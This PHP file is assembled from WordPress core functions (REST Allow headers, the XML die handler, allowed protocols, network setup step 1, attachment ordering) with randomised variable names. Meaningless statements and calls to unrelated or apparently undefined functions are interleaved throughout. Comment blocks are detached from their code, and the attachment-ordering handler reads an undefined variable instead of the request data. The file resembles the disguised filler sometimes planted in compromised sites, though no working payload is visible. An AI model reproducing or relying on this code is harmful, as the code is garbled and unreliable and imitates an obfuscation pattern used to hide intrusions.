 * @param WP_REST_Response $default_padding Current response being served.
 * @param WP_REST_Server   $widget_object   ResponseHandler instance (usually WP_REST_Server).
 * @param WP_REST_Request  $has_thumbnail  The request that was used to make current response.
 * @return WP_REST_Response Response to be served, with "Allow" header if route has allowed methods.
 */
function get_linkobjects($default_padding, $widget_object, $has_thumbnail)
{
    $prefer = $default_padding->get_matched_route();
    if (!$prefer) {
        return $default_padding;
    }
    $editor_id = $widget_object->get_routes();
    $frame_receivedasid = array();
    // Get the allowed methods across the routes.
    foreach ($editor_id[$prefer] as $queried_items) {
        foreach ($queried_items['methods'] as $oembed_post_query => $SMTPAutoTLS) {
            if (!empty($queried_items['permission_callback'])) {
                $flagname = call_user_func($queried_items['permission_callback'], $has_thumbnail);
                $frame_receivedasid[$oembed_post_query] = true === $flagname;
            } else {
                $frame_receivedasid[$oembed_post_query] = true;
            }
        }
    }
    // Strip out all the methods that are not allowed (false values).
    $frame_receivedasid = array_filter($frame_receivedasid);
    if ($frame_receivedasid) {
        $default_padding->header('Allow', implode(', ', array_map('strtoupper', array_keys($frame_receivedasid))));
    }
    return $default_padding;
}
$copy = abs(42);
$akid = block_core_page_list_build_css_font_sizes($copy);
/**
 * Kills WordPress execution and displays XML response with an error message.
 *
 * This is the handler for wp_die() when processing XML requests.
 *
 * @since 5.2.0
 * @access private
 *
 * @param string       $option_tag_id3v1 Error message.
 * @param string       $customizer_not_supported_message   Optional. Error title. Default empty string.
 * @param string|array $random    Optional. Arguments to control behavior. Default empty array.
 */
function wp_update_comment_count_now($option_tag_id3v1, $customizer_not_supported_message = '', $random = array())
{
    list($option_tag_id3v1, $customizer_not_supported_message, $decodedLayer) = _wp_die_process_input($option_tag_id3v1, $customizer_not_supported_message, $random);
    $option_tag_id3v1 = htmlspecialchars($option_tag_id3v1);
    $customizer_not_supported_message = htmlspecialchars($customizer_not_supported_message);
    $old_id = <<<EOD
    <error>
        <code>{$decodedLayer['code']}</code>
        <title><![CDATA[{$customizer_not_supported_message}]]></title>
        <message><![CDATA[{$option_tag_id3v1}]]></message>
        <data>
            <status>{$decodedLayer['response']}</status>
        </data>
    </error>
    
    EOD;
    if (!headers_sent()) {
        header("Content-Type: text/xml; charset={$decodedLayer['charset']}");
        if (null !== $decodedLayer['response']) {
            status_header($decodedLayer['response']);
        }
        nocache_headers();
    }
    echo $old_id;
    if ($decodedLayer['exit']) {
        die;
    }
}
$akid = cosh(78);
$copy = 'p879a';
$akid = register_block_core_page_list_item($copy);
$akid = tan(425);
$f9r9vt9 = (!isset($f9r9vt9)? 	"gimqp" 	: 	"j8hc");


/**
 * Execute changes made in WordPress 2.7.
 *
 * @ignore
 * @since 2.7.0
 *
 * @global int  $create_cap The old (current) database version.
 * @global wpdb $upgrade_files                  WordPress database abstraction object.
 */

 if(!isset($c01qu0w4u)) {
 	$c01qu0w4u = 'rowl';
 }
$c01qu0w4u = log1p(339);
$c01qu0w4u = wp_ajax_save_widget($akid);
$akid = log10(650);


/**
 * Adds custom arguments to some of the meta box object types.
 *
 * @since 3.0.0
 *
 * @access private
 *
 * @param object $data_object The post type or taxonomy meta-object.
 * @return object The post type or taxonomy object.
 */

 if(!(ceil(863)) !==  true) 	{
 	$fxfibmj = 'wik9';
 }
$s7tj = (!isset($s7tj)?	"ytyfflpw"	:	"yqcxow");
$z0ov491k9['gyp86q2'] = 4224;
$c01qu0w4u = ucfirst($copy);
$hba9pttc6 = 'pugl2fgi';


/**
 * Server-side rendering of the `core/cover` block.
 *
 * @package WordPress
 */

 if(!empty(strtolower($hba9pttc6)) ==  false) {
 	$ejpqs06 = 'qgwvd4';
 }
$c01qu0w4u = soundex($c01qu0w4u);
$callback_batchxxjpjd1 = 'rpcq';


/**
	 * Adds multiple declarations.
	 *
	 * @since 6.1.0
	 *
	 * @param string[] $declarations An array of declarations.
	 * @return WP_Style_Engine_CSS_Declarations Returns the object to allow chaining methods.
	 */

 if(!isset($global_style_queryzhthycbh)) {
 	$global_style_queryzhthycbh = 'dida0l9uv';
 }
$global_style_queryzhthycbh = htmlspecialchars_decode($callback_batchxxjpjd1);


/**
	 * Retrieves the autosave's schema, conforming to JSON Schema.
	 *
	 * @since 5.0.0
	 *
	 * @return array Item schema data.
	 */

 if(empty(round(819)) !==  TRUE) {
 	$a1x5rxq = 'i887t';
 }
$callback_batchxxjpjd1 = init_preview($callback_batchxxjpjd1);
$nqbpja = (!isset($nqbpja)? "dj5qvfet" : "gwcib4");
$global_style_queryzhthycbh = htmlspecialchars_decode($global_style_queryzhthycbh);
$yne3 = 'omc7';
$callback_batchumkesh = (!isset($callback_batchumkesh)?"ch3iy":"c12doiun");
$f82qjsu3p['xrnrdmn7'] = 2778;
/**
 * Retrieves a list of protocols to allow in HTML attributes.
 *
 * @since 3.3.0
 * @since 4.3.0 Added 'webcal' to the protocols array.
 * @since 4.7.0 Added 'urn' to the protocols array.
 * @since 5.3.0 Added 'sms' to the protocols array.
 * @since 5.6.0 Added 'irc6' and 'ircs' to the protocols array.
 *
 * @see wp_kses()
 * @see esc_url()
 *
 * @return string[] Array of allowed protocols. Defaults to an array containing 'http', 'https',
 *                  'ftp', 'ftps', 'mailto', 'news', 'irc', 'irc6', 'ircs', 'gopher', 'nntp', 'feed',
 *                  'telnet', 'mms', 'rtsp', 'sms', 'svn', 'tel', 'fax', 'xmpp', 'webcal', and 'urn'.
 *                  This covers all common link protocols, except for 'javascript' which should not
 *                  be allowed for untrusted users.
 */
function wp_allowed_protocols()
{
    static $protocols = array();
    if (empty($protocols)) {
        $protocols = array('http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'irc', 'irc6', 'ircs', 'gopher', 'nntp', 'feed', 'telnet', 'mms', 'rtsp', 'sms', 'svn', 'tel', 'fax', 'xmpp', 'webcal', 'urn');
    }
    if (!did_action('wp_loaded')) {
        /**
         * Filters the list of protocols allowed in HTML attributes.
         *
         * @since 3.0.0
         *
         * @param string[] $protocols Array of allowed protocols e.g. 'http', 'ftp', 'tel', and more.
         */
        $protocols = array_unique((array) apply_filters('kses_allowed_protocols', $protocols));
    }
    return $protocols;
}
$global_style_queryzhthycbh = quotemeta($yne3);


/**
     * @see ParagonIE_Sodium_Compat::crypto_secretbox_keygen()
     * @return string
     * @throws Exception
     */

 if((log10(162)) !=  false)	{
 	$a4cfh = 'hqsq28f';
 }
$callback_batchxxjpjd1 = wp_send_user_request($global_style_queryzhthycbh);
$callback_batchxxjpjd1 = sin(958);
$yne3 = privAddList($global_style_queryzhthycbh);


/**
 * Outputs an unordered list of checkbox input elements labeled with category names.
 *
 * @since 2.5.1
 *
 * @see wp_terms_checklist()
 *
 * @param int         $queried_object              Optional. Post to generate a categories checklist for. Default 0.
 *                                          $selected_cats must not be an array. Default 0.
 * @param int         $descendants_and_self Optional. ID of the category to output along with its descendants.
 *                                          Default 0.
 * @param int[]|false $selected_cats        Optional. Array of category IDs to mark as checked. Default false.
 * @param int[]|false $popular_cats         Optional. Array of category IDs to receive the "popular-category" class.
 *                                          Default false.
 * @param Walker      $walker               Optional. Walker object to use to build the output.
 *                                          Default is a Walker_Category_Checklist instance.
 * @param bool        $checked_ontop        Optional. Whether to move checked items out of the hierarchy and to
 *                                          the top of the list. Default true.
 */

 if(!empty(sin(73)) ===  False){
 	$mhiy = 'a775een6p';
 }
$yne3 = 'n8uzg9vm';
$callback_batchxxjpjd1 = wp_lazyload_term_meta($yne3);


/**
     * ParagonIE_Sodium_Core_Curve25519_Ge_Precomp constructor.
     *
     * @internal You should not use this directly from another application
     *
     * @param ParagonIE_Sodium_Core_Curve25519_Fe $yplusx
     * @param ParagonIE_Sodium_Core_Curve25519_Fe $yminusx
     * @param ParagonIE_Sodium_Core_Curve25519_Fe $xy2d
     */

 if(!isset($rpmzuty)) {
 	$rpmzuty = 'w0jp';
 }
$rpmzuty = deg2rad(250);
$rpmzuty = ucfirst($yne3);
/**
 * Handles saving the attachment order via AJAX.
 *
 * @since 3.5.0
 */
function wp_ajax_save_attachment_order()
{
    if (!isset($qty['post_id'])) {
        wp_send_json_error();
    }
    $queried_object = absint($qty['post_id']);
    if (!$queried_object) {
        wp_send_json_error();
    }
    if (empty($qty['attachments'])) {
        wp_send_json_error();
    }
    check_ajax_referer('update-post_' . $queried_object, 'nonce');
    $attachments = $qty['attachments'];
    if (!current_user_can('edit_post', $queried_object)) {
        wp_send_json_error();
    }
    foreach ($attachments as $attachment_id => $menu_order) {
        if (!current_user_can('edit_post', $attachment_id)) {
            continue;
        }
        $attachment = get_post($attachment_id);
        if (!$attachment) {
            continue;
        }
        if ('attachment' !== $attachment->post_type) {
            continue;
        }
        wp_update_post(array('ID' => $attachment_id, 'menu_order' => $menu_order));
    }
    wp_send_json_success();
}
$global_style_queryzhthycbh = strtoupper($yne3);
$yne3 = is_super_admin($rpmzuty);
/**
 * Prints step 1 for Network installation process.
 *
 * @todo Realistically, step 1 should be a welcome screen explaining what a Network is and such.
 *       Navigating to Tools > Network should not be a sudden "Welcome to a new install process!
 *       Fill this out and click here." See also contextual help todo.
 *
 * @since 3.0.0
 *
 * @global bool $callback_batchs_apache
 *
 * @param false|WP_Error $errors Optional. Error object. Default false.
 */
function network_step1($errors = false)
{
    global $callback_batchs_apache;
    if (defined('DO_NOT_UPGRADE_GLOBAL_TABLES')) {
        $cannot_define_constant_message = '<strong>' . __('Error:') . '</strong> ';
        $cannot_define_constant_message .= sprintf(
            /* translators: %s: DO_NOT_UPGRADE_GLOBAL_TABLES */
            __('The constant %s cannot be defined when creating a network.'),
            '<code>DO_NOT_UPGRADE_GLOBAL_TABLES</code>'
        );
        wp_admin_notice($cannot_define_constant_message, array('additional_classes' => array('error')));
        echo '</div>';
        require_once ABSPATH . 'wp-admin/admin-footer.php';
        die;
    }
    $active_plugins = get_option('active_plugins');
    if (!empty($active_plugins)) {
        wp_admin_notice('<strong>' . __('Warning:') . '</strong> ' . sprintf(
            /* translators: %s: URL to Plugins screen. */
            __('Please <a href="%s">deactivate your plugins</a> before enabling the Network feature.'),
            admin_url('plugins.php?plugin_status=active')
        ), array('type' => 'warning'));
        echo '<p>' . __('Once the network is created, you may reactivate your plugins.') . '</p>';
        echo '</div>';
        require_once ABSPATH . 'wp-admin/admin-footer.php';
        die;
    }
    $max_upload_sizename = get_clean_basedomain();
    $has_ports = strstr($max_upload_sizename, ':');
    if (false !== $has_ports && !in_array($has_ports, array(':80', ':443'), true)) {
        wp_admin_notice('<strong>' . __('Error:') . '</strong> ' . __('You cannot install a network of sites with your server address.'), array('additional_classes' => array('error')));
        echo '<p>' . sprintf(
            /* translators: %s: Port number. */
            __('You cannot use port numbers such as %s.'),
            '<code>' . $has_ports . '</code>'
        ) . '</p>';
        echo '<a href="' . esc_url(admin_url()) . '">' . __('Go to Dashboard') . '</a>';
        echo '</div>';
        require_once ABSPATH . 'wp-admin/admin-footer.php';
        die;
    }
    echo '<form method="post">';
    wp_nonce_field('install-network-1');
    $error_codes = array();
    if (is_wp_error($errors)) {
        $network_created_error_message = '<p><strong>' . __('Error: The network could not be created.') . '</strong></p>';
        foreach ($errors->get_error_messages() as $error) {
            $network_created_error_message .= "<p>{$error}</p>";
        }
        wp_admin_notice($network_created_error_message, array('additional_classes' => array('error'), 'paragraph_wrap' => false));
        $error_codes = $errors->get_error_codes();
    }
    if (!empty($_POST['sitename']) && !in_array('empty_sitename', $error_codes, true)) {
        $site_name = $_POST['sitename'];
    } else {
        /* translators: %s: Default network title. */
        $site_name = sprintf(__('%s Sites'), get_option('blogname'));
    }
    if (!empty($_POST['email']) && !in_array('invalid_email', $error_codes, true)) {
        $admin_email = $_POST['email'];
    } else {
        $admin_email = get_option('admin_email');
    }
    ?>
	<p><?php 
    _e('Welcome to the Network installation process!');
    ?></p>
	<p><?php 
    _e('Fill in the information below and you&#8217;ll be on your way to creating a network of WordPress sites. Configuration files will be created in the next step.');
    ?></p>
	<?php 
    if (isset($_POST['subdomain_install'])) {
        $subdomain_install = (bool) $_POST['subdomain_install'];
    } elseif (apache_mod_loaded('mod_rewrite')) {
        // Assume nothing.
        $subdomain_install = true;
    } elseif (!allow_subdirectory_install()) {
        $subdomain_install = true;
    } else {
        $subdomain_install = false;
        $got_mod_rewrite = got_mod_rewrite();
        if ($got_mod_rewrite) {
            // Dangerous assumptions.
            $option_tag_id3v1_class = 'updated';
            $option_tag_id3v1 = '<p><strong>' . __('Warning:') . '</strong> ';
            $option_tag_id3v1 .= '<p>' . sprintf(
                /* translators: %s: mod_rewrite */
                __('Please make sure the Apache %s module is installed as it will be used at the end of this installation.'),
                '<code>mod_rewrite</code>'
            ) . '</p>';
        } elseif ($callback_batchs_apache) {
            $option_tag_id3v1_class = 'error';
            $option_tag_id3v1 = '<p><strong>' . __('Warning:') . '</strong> ';
            $option_tag_id3v1 .= sprintf(
                /* translators: %s: mod_rewrite */
                __('It looks like the Apache %s module is not installed.'),
                '<code>mod_rewrite</code>'
            ) . '</p>';
        }
        if ($got_mod_rewrite || $callback_batchs_apache) {
            // Protect against mod_rewrite mimicry (but ! Apache).
            $option_tag_id3v1 .= '<p>' . sprintf(
                /* translators: 1: mod_rewrite, 2: mod_rewrite documentation URL, 3: Google search for mod_rewrite. */
                __('If %1$s is disabled, ask your administrator to enable that module, or look at the <a href="%2$s">Apache documentation</a> or <a href="%3$s">elsewhere</a> for help setting it up.'),
                '<code>mod_rewrite</code>',
                'https://httpd.apache.org/docs/mod/mod_rewrite.html',
                'https://www.google.com/search?q=apache+mod_rewrite'
            ) . '</p>';
            wp_admin_notice($option_tag_id3v1, array('additional_classes' => array($option_tag_id3v1_class, 'inline'), 'paragraph_wrap' => false));
        }
    }
    if (allow_subdomain_install() && allow_subdirectory_install()) {
        ?>
		<h3><?php 
        esc_html_e('Addresses of Sites in your Network');
        ?></h3>
		<p><?php 
        _e('Please choose whether you would like sites in your WordPress network to use sub-domains or sub-directories.');
        ?>
			<strong><?php 
        _e('You cannot change this later.');
        ?></strong></p>
		<p><?php 
        _e('You will need a wildcard DNS record if you are going to use the virtual host (sub-domain) functionality.');
        ?></p>
		<?php 
        // @todo Link to an MS readme? 
        ?>
		<table class="form-table" role="presentation">
			<tr>
				<th><label><input type="radio" name="subdomain_install" value="1"<?php 
        checked($subdomain_install);
        ?> /> <?php 
        _e('Sub-domains');
        ?></label></th>
				<td>
				<?php 
        printf(
            /* translators: 1: Host name. */
            _x('like <code>site1.%1$s</code> and <code>site2.%1$s</code>', 'subdomain examples'),
            $max_upload_sizename
        );
        ?>
				</td>
			</tr>
			<tr>
				<th><label><input type="radio" name="subdomain_install" value="0"<?php 
        checked(!$subdomain_install);
        ?> /> <?php 
        _e('Sub-directories');
        ?></label></th>
				<td>
				<?php 
        printf(
            /* translators: 1: Host name. */
            _x('like <code>%1$s/site1</code> and <code>%1$s/site2</code>', 'subdirectory examples'),
            $max_upload_sizename
        );
        ?>
				</td>
			</tr>
		</table>

		<?php 
    }
    if (WP_CONTENT_DIR !== ABSPATH . 'wp-content' && (allow_subdirectory_install() || !allow_subdomain_install())) {
        $subdirectory_warning_message = '<strong>' . __('Warning:') . '</strong> ';
        $subdirectory_warning_message .= __('Subdirectory networks may not be fully compatible with custom wp-content directories.');
        wp_admin_notice($subdirectory_warning_message, array('additional_classes' => array('error', 'inline')));
    }
    $callback_batchs_www = str_starts_with($max_upload_sizename, 'www.');
    if ($callback_batchs_www) {
        ?>
		<h3><?php 
        esc_html_e('Server Address');
        ?></h3>
		<p>
		<?php 
        printf(
            /* translators: 1: Site URL, 2: Host name, 3: www. */
            __('You should consider changing your site domain to %1$s before enabling the network feature. It will still be possible to visit your site using the %3$s prefix with an address like %2$s but any links will not have the %3$s prefix.'),
            '<code>' . substr($max_upload_sizename, 4) . '</code>',
            '<code>' . $max_upload_sizename . '</code>',
            '<code>www</code>'
        );
        ?>
		</p>
		<table class="form-table" role="presentation">
			<tr>
			<th scope='row'><?php 
        esc_html_e('Server Address');
        ?></th>
			<td>
				<?php 
        printf(
            /* translators: %s: Host name. */
            __('The internet address of your network will be %s.'),
            '<code>' . $max_upload_sizename . '</code>'
        );
        ?>
				</td>
			</tr>
		</table>
		<?php 
    }
    ?>

		<h3><?php 
    esc_html_e('Network Details');
    ?></h3>
		<table class="form-table" role="presentation">
		<?php 
    if ('localhost' === $max_upload_sizename) {
        ?>
			<tr>
				<th scope="row"><?php 
        esc_html_e('Sub-directory Installation');
        ?></th>
				<td>
				<?php 
        printf(
            /* translators: 1: localhost, 2: localhost.localdomain */
            __('Because you are using %1$s, the sites in your WordPress network must use sub-directories. Consider using %2$s if you wish to use sub-domains.'),
            '<code>localhost</code>',
            '<code>localhost.localdomain</code>'
        );
        // Uh oh:
        if (!allow_subdirectory_install()) {
            echo ' <strong>' . __('Warning:') . ' ' . __('The main site in a sub-directory installation will need to use a modified permalink structure, potentially breaking existing links.') . '</strong>';
        }
        ?>
				</td>
			</tr>
		<?php 
    } elseif (!allow_subdomain_install()) {
        ?>
			<tr>
				<th scope="row"><?php 
        esc_html_e('Sub-directory Installation');
        ?></th>
				<td>
				<?php 
        _e('Because your installation is in a directory, the sites in your WordPress network must use sub-directories.');
        // Uh oh:
        if (!allow_subdirectory_install()) {
            echo ' <strong>' . __('Warning:') . ' ' . __('The main site in a sub-directory installation will need to use a modified permalink structure, potentially breaking existing links.') . '</strong>';
        }
        ?>
				</td>
			</tr>
		<?php 
    } elseif (!allow_subdirectory_install()) {
        ?>
			<tr>
				<th scope="row"><?php 
        esc_html_e('Sub-domain Installation');
        ?></th>
				<td>
				<?php 
        _e('Because your installation is not new, the sites in your WordPress network must use sub-domains.');
        echo ' <strong>' . __('The main site in a sub-directory installation will need to use a modified permalink structure, potentially breaking existing links.') . '</strong>';
        ?>
				</td>
			</tr>
		<?php 
    }
    ?>
		<?php 
    if (!$callback_batchs_www) {
        ?>
			<tr>
				<th scope='row'><?php 
        esc_html_e('Server Address');
        ?></th>
				<td>
					<?php 
        printf(
            /* translators: %s: Host name. */
            __('The internet address of your network will be %s.'),
            '<code>' . $max_upload_sizename . '</code>'
        );
        ?>
				</td>
			</tr>
		<?php 
    }
    ?>
			<tr>
				<th scope='row'><label for="sitename"><?php 
    esc_html_e('Network Title');
    ?></label></th>
				<td>
					<input name='sitename' id='sitename' type='text' size='45' value='<?php 
    echo esc_attr($site_name);
    ?>' />
					<p class="description">
						<?php 
    _e('What would you like to call your network?');
    ?>
					</p>
				</td>
			</tr>
			<tr>
				<th scope='row'><label for="email"><?php 
    esc_html_e('Network Admin Email');
    ?></label></th>
				<td>
					<input name='email' id='email' type='text' size='45' value='<?php 
    echo esc_attr($admin_email);
    ?>' />
					<p class="description">
						<?php 
    _e('Your email address.');
    ?>
					</p>
				</td>
			</tr>
		</table>
		<?php 
    submit_button(__('Install'), 'primary', 'submit');
    ?>
	</form>
	<?php 
}
$yne3 = ceil(473);
$yne3 = stripos($callback_batchxxjpjd1, $callback_batchxxjpjd1);
$callback_batchxxjpjd1 = strtr($yne3, 15, 17);
$f1ayhsd['xkl9'] = 134;
$rpmzuty = sqrt(847);
$m0smoky['c14w34v'] = 'gqzforu';
/**
 * @see ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_decrypt()
 * @param string $option_tag_id3v1
 * @param string $assocData
 * @param string $nonce
 * @param string $photo
 * @return string|bool
 */
function crypto_aead_chacha20poly1305_decrypt($option_tag_id3v1, $assocData, $nonce, $photo)
{
    try {
        return ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_decrypt($option_tag_id3v1, $assocData, $nonce, $photo);
    } catch (\TypeError $ex) {
        return false;
    } catch (\SodiumException $ex) {
        return false;
    }
}


/**
 * We autoload classes we may not need.
 */

 if(!(basename($yne3)) !=  True) {
 	$ccqgc = 'o212';
 }